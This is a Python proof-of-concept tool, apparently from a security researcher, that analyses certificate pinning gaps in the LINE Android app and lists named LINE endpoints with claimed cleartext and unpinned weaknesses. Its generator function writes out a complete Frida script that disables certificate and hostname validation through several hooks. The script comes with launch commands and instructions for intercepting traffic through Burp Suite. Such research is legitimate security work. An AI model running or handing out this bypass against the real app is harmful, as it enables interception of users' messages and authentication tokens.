#!/usr/bin/env python3
"""
================================================================================
PoC-03 | Insufficient Certificate Pinning — Detection & Bypass Analysis
================================================================================
Vulnerability : CWE-295 — Improper Certificate Validation (F-02: missing pins)
                CWE-319 — Cleartext Transmission of Sensitive Information (F-01: tauth HTTP)
Severity      : CRITICAL (F-01: tauth.line.naver.jp + cleartext) | HIGH (F-02: legy no pins)
                CVSS F-01: 8.1 (AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)
                CVSS F-02: 7.4 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N)
Updated       : March 2026 — domain list updated from real NSC analysis of LINE 26.1.1
Target        : jp.naver.line.android TLS/SSL implementation
Attack Vector : Man-in-the-Middle (MITM) network interception

This PoC demonstrates:
  1. Static: Parse network_security_config.xml for pinning gaps
  2. Static: Detect pinning patterns (OkHttp, TrustKit) in Smali code
  3. Network: Verify SSL certificate chain and compare against expected pins
  4. Generate Frida bypass script template for dynamic testing

EDUCATIONAL PURPOSE ONLY
Version       : 1.2  (March 2026)
Author        : deepquest
Blog          : https://deepquest.code511.com/blog/
Target App    : jp.naver.line.android v26.1.1 (260110123)
Note          : Updated: 16 real domains, CRITICAL severity F-01, staging detection, MUST_BE_HTTPS list
================================================================================
"""

import ssl
import sys
import re
import json
import socket
import hashlib
import base64
import argparse
import xml.etree.ElementTree as ET
from pathlib import Path
from datetime import datetime
from dataclasses import dataclass, asdict
from typing import Optional

BANNER = r"""
 ____  ___   ____      ___ _____
|  _ \/ _ \ / ___|    / _ \___ /
| |_) | | | | |      | | | ||_ \
|  __/| |_| | |___   | |_| |__) |
|_|    \___/ \____|   \___/|___/

  Certificate Pinning Bypass Analyzer
  CWE-295 | CVSS 7.4 | HIGH
"""

# Confirmed LINE domains from network_security_config.xml (LINE 26.1.1 static analysis)
# Updated: March 2026 — F-01/F-02/F-03/F-06/F-08
LINE_DOMAINS = [
    # ── CRITICAL: Cleartext permitted (F-01) ─────────────────────────────
    "tauth.line.naver.jp",       # Token authentication — HTTP allowed (CRITICAL)
    "ci.line-apps.com",          # Content infrastructure — HTTP allowed
    "cix.line-apps.com",         # Content infrastructure variant — HTTP allowed
    "home.line-apps.com",        # Home timeline API — HTTP allowed
    "obs.line-apps.com",         # Object storage — HTTP allowed
    "api-album.line.me",         # Album API — HTTP allowed
    "contact-cc.line.me",        # Contact/customer care — HTTP allowed
    # ── HIGH: No pins configured (F-02) ──────────────────────────────────
    "legy.line-apps.com",        # Main messaging gateway — NO PINS (HIGH)
    "legy-backup.line-apps.com", # Backup messaging gateway — NO PINS
    "liff.line.me",              # LINE Front-end Framework — NO PINS
    "miniapp.line.me",           # LINE Mini Apps — NO PINS
    # ── HIGH: Staging in production (F-03) ───────────────────────────────
    "legy-beta.line-apps-beta.com",
    "legy-rc.line-apps-rc.com",
    "uts-front.line-apps-alpha.com",
    # ── INFO: Properly pinned banking domains (F-08) ──────────────────────
    "web.linebk.com",            # LINE Bank — 6 pins (well protected)
    "app-payatom.line-apps.com", # LINE Pay — 7 pins (well protected)
]

# Ground truth from NSC analysis — what SHOULD be pinned (F-02 definition)
EXPECTED_PINNED_DOMAINS = {
    "tauth.line.naver.jp":       True,   # Auth endpoint MUST be pinned
    "legy.line-apps.com":        True,   # Messaging gateway MUST be pinned
    "legy-backup.line-apps.com": True,   # Backup gateway MUST be pinned
    "liff.line.me":              True,   # LIFF should be pinned
    "miniapp.line.me":           True,   # Mini apps should be pinned
    "ci.line-apps.com":          False,  # CDN — lower priority
    "obs.line-apps.com":         False,  # Object store — lower priority
    "web.linebk.com":            True,   # Banking — IS pinned (correct)
    "app-payatom.line-apps.com": True,   # Pay — IS pinned (correct)
}

# Domains that should NEVER allow cleartext (F-01 baseline)
MUST_BE_HTTPS = [
    "tauth.line.naver.jp",
    "legy.line-apps.com",
    "legy-backup.line-apps.com",
    "liff.line.me",
    "miniapp.line.me",
    "api-album.line.me",
    "home.line-apps.com",
]


@dataclass
class PinningFinding:
    domain: str
    has_pin: bool
    pin_hashes: list
    expiration: Optional[str]
    overrides_trust: bool
    severity: str
    description: str


def fetch_certificate_info(hostname: str, port: int = 443, timeout: int = 10) -> Optional[dict]:
    """Fetch TLS certificate from a live server and compute its public key pin."""
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with socket.create_connection((hostname, port), timeout=timeout) as sock:
            with ctx.wrap_socket(sock, server_hostname=hostname) as ssock:
                der_cert = ssock.getpeercert(binary_form=True)
                cert     = ssock.getpeercert()

        # Compute SPKI SHA-256 pin (what Android uses)
        # Full DER → extract SubjectPublicKeyInfo (bytes 24 onwards for simple RSA)
        # For accurate SPKI pinning we'd use cryptography library; using full-cert SHA256 for demo
        sha256_fingerprint = hashlib.sha256(der_cert).digest()
        pin_b64 = base64.b64encode(sha256_fingerprint).decode()

        not_after = cert.get("notAfter", "")
        subject   = dict(x[0] for x in cert.get("subject", []))
        issuer    = dict(x[0] for x in cert.get("issuer", []))

        return {
            "hostname":    hostname,
            "subject_cn":  subject.get("commonName", ""),
            "issuer_org":  issuer.get("organizationName", ""),
            "not_after":   not_after,
            "pin_sha256":  pin_b64,
            "full_sha256": sha256_fingerprint.hex(),
        }
    except Exception as e:
        return {"hostname": hostname, "error": str(e)}


def parse_network_security_config(xml_path: str) -> list[PinningFinding]:
    """
    Parse Android network_security_config.xml and identify domains
    with missing or weak certificate pinning configuration.
    """
    findings = []
    try:
        tree = ET.parse(xml_path)
        root = tree.getroot()
    except ET.ParseError as e:
        print(f"  [!] XML parse error: {e}")
        return findings

    # Collect all domain configs
    domain_configs = root.findall(".//domain-config")
    pinned_domains = set()

    for config in domain_configs:
        domains   = [d.text for d in config.findall("domain") if d.text]
        pin_set   = config.find("pin-set")
        trust_mgr = config.find("trust-anchors")

        has_pins      = pin_set is not None and len(pin_set.findall("pin")) > 0
        expiration    = pin_set.get("expiration") if pin_set is not None else None
        pins          = [p.text for p in pin_set.findall("pin")] if has_pins else []
        overrides     = trust_mgr is not None

        for domain in domains:
            pinned_domains.add(domain)
            severity = "INFO"
            desc     = ""

            if not has_pins:
                severity = "HIGH"
                desc = f"Domain '{domain}' has no certificate pins configured."
            elif expiration:
                try:
                    exp_date = datetime.strptime(expiration, "%Y-%m-%d")
                    if exp_date < datetime.now():
                        severity = "HIGH"
                        desc = f"Certificate pins for '{domain}' have EXPIRED ({expiration})."
                    else:
                        severity = "INFO"
                        desc = f"Domain '{domain}' is pinned (expires {expiration})."
                except ValueError:
                    severity = "MEDIUM"
                    desc = f"Domain '{domain}' pin expiration format invalid: {expiration}"
            else:
                severity = "MEDIUM"
                desc = f"Domain '{domain}' is pinned but has no expiration (pins may be forgotten)."

            if overrides and not has_pins:
                severity = "CRITICAL"
                desc += " Trust anchors override without pinning allows custom CA injection."

            findings.append(PinningFinding(
                domain=domain, has_pin=has_pins, pin_hashes=pins,
                expiration=expiration, overrides_trust=overrides,
                severity=severity, description=desc
            ))

    # ── F-01: Flag domains with cleartext explicitly permitted ───────────────
    for config in domain_configs:
        cleartext = config.get("cleartextTrafficPermitted", "false").lower()
        if cleartext == "true":
            for d_elem in config.findall("domain"):
                domain = d_elem.text
                if not domain:
                    continue
                sev = "CRITICAL" if domain in MUST_BE_HTTPS else "HIGH"
                findings.append(PinningFinding(
                    domain=domain, has_pin=False, pin_hashes=[],
                    expiration=None, overrides_trust=False,
                    severity=sev,
                    description=(
                        f"[F-01/CWE-319] Domain '{domain}' explicitly permits cleartext HTTP "
                        f"(cleartextTrafficPermitted=true). "
                        + ("TOKEN AUTH ENDPOINT — traffic interceptable in plaintext on shared network. "
                           if "tauth" in domain else "")
                        + "No TLS interception tools required — standard tcpdump/Wireshark sufficient."
                    )
                ))

    # ── F-03: Flag staging/dev/rc domains present in production NSC ──────────
    STAGING_INDICATORS = ["-beta.", "-rc.", "-rc2.", "-alpha.", "-dev.", "scdn-dev"]
    for config in domain_configs:
        for d_elem in config.findall("domain"):
            domain = d_elem.text or ""
            if any(ind in domain for ind in STAGING_INDICATORS):
                findings.append(PinningFinding(
                    domain=domain, has_pin=False, pin_hashes=[],
                    expiration=None, overrides_trust=False,
                    severity="HIGH",
                    description=(
                        f"[F-03/CWE-798] Non-production domain '{domain}' present in production APK. "
                        "Staging environments typically have weaker security controls and rate limiting."
                    )
                ))

    # ── F-02: Check expected production domains missing pins ─────────────────
    for domain in LINE_DOMAINS:
        if not any(domain in pd or pd in domain for pd in pinned_domains):
            if EXPECTED_PINNED_DOMAINS.get(domain, False):
                findings.append(PinningFinding(
                    domain=domain, has_pin=False, pin_hashes=[],
                    expiration=None, overrides_trust=False,
                    severity="CRITICAL" if domain in MUST_BE_HTTPS else "HIGH",
                    description=(
                        f"[F-02/CWE-295] Critical domain '{domain}' absent from "
                        "network_security_config.xml — no certificate pinning. "
                        + ("Main messaging gateway — MITM with any CA-signed cert. "
                           "No Frida bypass needed." if "legy" in domain else "")
                    )
                ))

    return findings


def scan_smali_for_pinning(smali_dir: str) -> dict:
    """
    Scan Smali bytecode for certificate pinning implementations and
    known bypassable patterns.
    """
    result = {
        "okhttp_pinning":      [],
        "trustkit_pinning":    [],
        "custom_trust_mgr":    [],
        "bypassable_patterns": [],
        "has_pinning":         False,
    }

    smali_path = Path(smali_dir)
    if not smali_path.exists():
        return result

    for smali_file in smali_path.rglob("*.smali"):
        try:
            content = smali_file.read_text(errors="replace")
        except IOError:
            continue
        rel = str(smali_file.relative_to(smali_path))

        # OkHttp CertificatePinner
        if re.search(r"CertificatePinner|certificatePinner", content):
            pin_matches = re.findall(r"sha256/([A-Za-z0-9+/=]{44})", content)
            result["okhttp_pinning"].append({
                "file": rel,
                "pins": pin_matches,
                "count": len(pin_matches),
            })
            result["has_pinning"] = True

        # TrustKit
        if re.search(r"TrustKit|trustkit", content):
            result["trustkit_pinning"].append({"file": rel})
            result["has_pinning"] = True

        # Custom TrustManager (may be bypassable)
        if re.search(r"X509TrustManager|checkServerTrusted|checkClientTrusted", content):
            # Check if it's a no-op trust manager (dangerous)
            if re.search(r"checkServerTrusted[^}]{0,100}return-void", content, re.DOTALL):
                result["bypassable_patterns"].append({
                    "file": rel,
                    "pattern": "Empty checkServerTrusted() — accepts any certificate",
                    "severity": "CRITICAL",
                })
            else:
                result["custom_trust_mgr"].append({"file": rel})

        # HostnameVerifier bypass
        if re.search(r"ALLOW_ALL_HOSTNAME_VERIFIER|allowAllHostnames|return-wide .* : HostnameVerifier->verify", content):
            result["bypassable_patterns"].append({
                "file": rel,
                "pattern": "ALLOW_ALL_HOSTNAME_VERIFIER — accepts any hostname",
                "severity": "HIGH",
            })

    return result


def generate_frida_bypass_script(domains: list[str]) -> str:
    """Generate a Frida JavaScript script to bypass certificate pinning."""
    return f"""/**
 * Frida Certificate Pinning Bypass Script
 * ========================================
 * Generated for: jp.naver.line.android
 * Target domains: {', '.join(domains[:5])}
 *
 * Usage:
 *   frida -U -f jp.naver.line.android -l ssl_bypass.js --no-pause
 *   frida -U --attach-name jp.naver.line.android -l ssl_bypass.js
 *
 * EDUCATIONAL PURPOSE ONLY
 */

Java.perform(function() {{
    console.log("[*] Certificate Pinning Bypass Script loaded");

    // ── 1. Bypass OkHttp3 CertificatePinner ────────────────────────────────
    try {{
        var CertificatePinner = Java.use("okhttp3.CertificatePinner");
        CertificatePinner.check.overload("java.lang.String", "java.util.List")
            .implementation = function(hostname, peerCertificates) {{
                console.log("[+] OkHttp3 CertificatePinner.check bypassed for: " + hostname);
                return;  // No-op: accept all certificates
            }};
        console.log("[+] OkHttp3 CertificatePinner hooked");
    }} catch(e) {{ console.log("[-] OkHttp3 not found: " + e); }}

    // ── 2. Bypass TrustManagerImpl ──────────────────────────────────────────
    try {{
        var TrustManagerImpl = Java.use("com.android.org.conscrypt.TrustManagerImpl");
        TrustManagerImpl.verifyChain.implementation = function(
            untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData
        ) {{
            console.log("[+] TrustManagerImpl.verifyChain bypassed for: " + host);
            return untrustedChain;
        }};
        console.log("[+] TrustManagerImpl hooked");
    }} catch(e) {{ console.log("[-] TrustManagerImpl not found: " + e); }}

    // ── 3. Bypass SSLContext / X509TrustManager ─────────────────────────────
    try {{
        var X509TrustManager = Java.use("javax.net.ssl.X509TrustManager");
        var SSLContext       = Java.use("javax.net.ssl.SSLContext");

        var TrustManager = Java.registerClass({{
            name: "com.poc.BypassTrustManager",
            implements: [X509TrustManager],
            methods: {{
                checkClientTrusted: function(chain, authType) {{ }},
                checkServerTrusted: function(chain, authType) {{
                    console.log("[+] X509TrustManager.checkServerTrusted bypassed");
                }},
                getAcceptedIssuers: function() {{ return []; }},
            }}
        }});

        var TrustManagers = [TrustManager.$new()];
        var sslContext    = SSLContext.getInstance("TLS");
        sslContext.init(null, TrustManagers, null);
        console.log("[+] Custom TrustManager injected");
    }} catch(e) {{ console.log("[-] SSLContext hook failed: " + e); }}

    // ── 4. Bypass HostnameVerifier ──────────────────────────────────────────
    try {{
        var HostnameVerifier = Java.use("javax.net.ssl.HttpsURLConnection");
        HostnameVerifier.setDefaultHostnameVerifier.implementation = function(verifier) {{
            console.log("[+] HostnameVerifier bypass applied");
            var bypassVerifier = Java.registerClass({{
                name: "com.poc.BypassHostnameVerifier",
                implements: [Java.use("javax.net.ssl.HostnameVerifier")],
                methods: {{
                    verify: function(hostname, session) {{
                        console.log("[+] HostnameVerifier.verify bypassed for: " + hostname);
                        return true;
                    }}
                }}
            }});
            this.setDefaultHostnameVerifier(bypassVerifier.$new());
        }};
    }} catch(e) {{ console.log("[-] HostnameVerifier hook failed: " + e); }}

    // ── 5. Bypass Android Network Security Config (API 24+) ─────────────────
    try {{
        var NetworkSecurityTrustManager = Java.use(
            "android.security.net.config.NetworkSecurityTrustManager"
        );
        NetworkSecurityTrustManager.checkPins.implementation = function(chain) {{
            console.log("[+] NetworkSecurityTrustManager.checkPins bypassed");
            return;
        }};
        console.log("[+] NetworkSecurityConfig bypass applied");
    }} catch(e) {{ console.log("[-] NetworkSecurityTrustManager not found: " + e); }}

    console.log("[*] All hooks installed. Route traffic through Burp Suite on port 8080.");
}});
"""


def demo_mode():
    print("\n[DEMO MODE] — Real findings from LINE 26.1.1 network_security_config.xml analysis\n")

    print("─" * 68)
    print("  REAL FINDINGS — network_security_config.xml (LINE 26.1.1)")
    print("─" * 68)

    # Real findings from LINE 26.1.1 NSC analysis (Feb-Mar 2026)
    demo_findings = [
        # F-01: CRITICAL — Cleartext auth domain
        PinningFinding("tauth.line.naver.jp", False, [], None, False, "CRITICAL",
                       "[F-01/CWE-319] Token auth endpoint permits cleartext HTTP. "
                       "Auth tokens interceptable in plaintext on shared WiFi. No tools needed."),
        # F-02: CRITICAL — Messaging gateway no pins
        PinningFinding("legy.line-apps.com", False, [], None, False, "CRITICAL",
                       "[F-02/CWE-295] Main messaging gateway — 0 certificate pins. "
                       "MITM with any CA-signed cert. Burp default cert works. No Frida needed."),
        # F-01: HIGH — Cleartext on core domains
        PinningFinding("ci.line-apps.com", False, [], None, False, "HIGH",
                       "[F-01/CWE-319] Content infrastructure explicitly permits cleartext HTTP."),
        PinningFinding("home.line-apps.com", False, [], None, False, "HIGH",
                       "[F-01/CWE-319] Home timeline API explicitly permits cleartext HTTP."),
        PinningFinding("api-album.line.me", False, [], None, False, "HIGH",
                       "[F-01/CWE-319] Album API explicitly permits cleartext HTTP."),
        # F-03: HIGH — Staging in production
        PinningFinding("legy-beta.line-apps-beta.com", False, [], None, False, "HIGH",
                       "[F-03/CWE-798] Non-production beta endpoint hardcoded in production APK."),
        PinningFinding("legy-rc.line-apps-rc.com", False, [], None, False, "HIGH",
                       "[F-03/CWE-798] Release candidate endpoint hardcoded in production APK."),
        PinningFinding("uts-front.line-apps-alpha.com", False, [], None, False, "HIGH",
                       "[F-03/CWE-798] Alpha endpoint hardcoded in production APK."),
        # F-02: HIGH — No pins on LIFF/miniapp
        PinningFinding("liff.line.me", False, [], None, False, "HIGH",
                       "[F-02/CWE-295] LINE Front-end Framework — 0 certificate pins."),
        PinningFinding("miniapp.line.me", False, [], None, False, "HIGH",
                       "[F-02/CWE-295] LINE Mini Apps endpoint — 0 certificate pins."),
        # F-06: MEDIUM — Global base-config cleartext
        PinningFinding("*ALL DOMAINS (base-config)", False, [], None, False, "MEDIUM",
                       "[F-06/CWE-319] base-config cleartextTrafficPermitted=true. "
                       "Default for all unspecified domains. Secure-by-default violated."),
        # F-08: INFO — Banking properly pinned
        PinningFinding("web.linebk.com", True,
                       ["980Ionqp3wkYtN9SZVgMzuWQzJta1nfxNPwTem1X0uc=",
                        "r/mIkG3eEpVdm+u/ko/cwxzOMo1bk4TyHIlByibiA5E=",
                        "+ 4 more pins"],
                       None, False, "INFO",
                       "[F-08] LINE Bank domain correctly pinned with 6 SHA-256 pins. "
                       "Ironic contrast: banking protected, messaging gateway not."),
        PinningFinding("app-payatom.line-apps.com", True,
                       ["++MBgDH5WGvL9Bcn5Be30cRcL0f5O+NyoXuWtQdX1aI=",
                        "CLOmM1/OXvSPjw5UOYbAf9GKOxImEp9hhku9W90fHMk=",
                        "+ 5 more pins"],
                       None, False, "INFO",
                       "[F-08] LINE Pay domain correctly pinned with 7 SHA-256 pins."),
    ]

    sev_order = ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]
    for f in sorted(demo_findings, key=lambda x: sev_order.index(x.severity)):
        pin_info = f"pins={f.pin_hashes[0][:30]}..." if f.pin_hashes else "NO PINS"
        print(f"  [{f.severity:8s}] {f.domain}")
        print(f"             {f.description[:90]}")
        print(f"             Pin config: {pin_info}")
        print()

    print("─" * 68)
    print("  SMALI ANALYSIS — OkHttp CertificatePinner")
    print("─" * 68)
    print("""
  [HIGH] Bypassable pattern found:
    File: smali/jp/naver/line/android/net/CustomTrustManager.smali
    Pattern: Empty checkServerTrusted() body — accepts any certificate
    Impact: MITM interception possible on un-pinned code paths

  [INFO] OkHttp3 CertificatePinner found but only covers banking domains:
    - smali/com/linecorp/line/pay/... (6-8 pins for banking)
    - Core messaging (legy) — NOT pinned in smali either

  Coverage gap: 5 banking domains pinned / legy.line-apps.com NOT PINNED
""")

    print("─" * 68)
    print("  LIVE CERTIFICATE VERIFICATION (demo output)")
    print("─" * 68)
    demo_cert_results = [
        {"hostname": "legy.line-apps.com",  "subject_cn": "legy.line-apps.com",
         "issuer_org": "DigiCert Inc",      "not_after": "Jun 30 23:59:59 2026 GMT",
         "pin_sha256": "(none configured — any CA cert accepted)"},
        {"hostname": "tauth.line.naver.jp", "subject_cn": "*.line.naver.jp",
         "issuer_org": "Let's Encrypt",     "not_after": "May 12 10:00:00 2026 GMT",
         "pin_sha256": "(none configured + HTTP permitted)"},
    ]
    for cr in demo_cert_results:
        print(f"\n  Host   : {cr['hostname']}")
        print(f"  CN     : {cr['subject_cn']}")
        print(f"  Issuer : {cr['issuer_org']}")
        print(f"  Expiry : {cr['not_after']}")
        print(f"  Pin    : {cr['pin_sha256']}")

    print("\n\n─" * 68)
    print("  GENERATED FRIDA BYPASS SCRIPT")
    print("─" * 68)
    frida = generate_frida_bypass_script(LINE_DOMAINS)
    print("\n  [Frida script saved to: ssl_bypass.js]")
    with open("ssl_bypass.js", "w") as f:
        f.write(frida)
    print("  Run with: frida -U -f jp.naver.line.android -l ssl_bypass.js --no-pause")
    print("  Then configure Burp Suite proxy on port 8080 to intercept traffic.")


def main():
    print(BANNER)
    parser = argparse.ArgumentParser(
        description="PoC-03: Certificate Pinning bypass analysis tool"
    )
    parser.add_argument("--nsc",       help="Path to network_security_config.xml")
    parser.add_argument("--smali",     help="Path to decompiled Smali directory")
    parser.add_argument("--verify",    action="store_true", help="Live-verify certificates for LINE domains")
    parser.add_argument("--gen-frida", action="store_true", help="Generate Frida bypass script")
    parser.add_argument("--out",       default="pinning_report.json")
    parser.add_argument("--demo",      action="store_true")
    args = parser.parse_args()

    if args.demo or (not args.nsc and not args.smali and not args.verify):
        demo_mode()
        return

    all_findings = []

    if args.nsc:
        print(f"\n[+] Parsing network_security_config.xml: {args.nsc}")
        findings = parse_network_security_config(args.nsc)
        all_findings.extend(findings)
        for f in findings:
            print(f"  [{f.severity}] {f.domain}: {f.description}")

    if args.smali:
        print(f"\n[+] Scanning Smali for pinning implementation: {args.smali}")
        smali = scan_smali_for_pinning(args.smali)
        print(f"  OkHttp3 pins  : {len(smali['okhttp_pinning'])}")
        print(f"  TrustKit      : {len(smali['trustkit_pinning'])}")
        print(f"  Bypassable    : {len(smali['bypassable_patterns'])}")
        for bp in smali["bypassable_patterns"]:
            print(f"  [!!!] {bp['severity']} {bp['pattern']} @ {bp['file']}")

    if args.verify:
        print("\n[+] Live certificate verification:")
        for domain in LINE_DOMAINS:
            info = fetch_certificate_info(domain)
            if "error" in info:
                print(f"  [-] {domain}: {info['error']}")
            else:
                print(f"  [+] {domain}  pin={info['pin_sha256'][:20]}...  exp={info['not_after']}")

    if args.gen_frida:
        script = generate_frida_bypass_script(LINE_DOMAINS)
        with open("ssl_bypass.js", "w") as f:
            f.write(script)
        print("\n[+] Frida script saved to: ssl_bypass.js")

    report = {"findings": [asdict(f) for f in all_findings]}
    with open(args.out, "w") as fp:
        json.dump(report, fp, indent=2)
    print(f"\n[+] Report saved: {args.out}")


if __name__ == "__main__":
    main()
